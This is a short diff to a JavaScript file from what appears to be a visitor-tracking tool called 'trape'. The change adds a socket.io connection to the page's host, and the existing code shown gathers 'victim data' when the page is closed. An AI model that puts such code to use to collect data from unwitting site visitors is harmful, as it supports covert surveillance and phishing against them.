@@ -1,6 +1,11 @@
 var urlServices = [];
 var Services = [];
 
+if (typeof(io) != 'undefined') {
+        namespace = '/trape';
+        var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
+    }
+
 window.onbeforeunload = function(e) {
     var d = getVictimData();
     console.log(d);
